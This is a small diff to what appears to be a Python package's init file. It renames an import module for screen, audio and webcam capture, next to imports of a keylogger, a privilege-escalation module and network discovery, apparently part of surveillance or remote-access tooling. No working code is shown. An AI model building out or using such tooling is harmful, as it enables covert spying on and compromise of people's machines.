@@ -3,7 +3,7 @@
 
 from .keylogger import Keylogger, FallbackKeylogger, PYNPUT_AVAILABLE
 from .privilege_escalation import PrivilegeEscalation
-from .screen_audio_capture import ScreenCapture, AudioCapture, WebcamCapture
+from .media_capture_tool import ScreenCapture, AudioCapture, WebcamCapture
 from .network_discovery import NetworkDiscovery
 
 __all__ = [
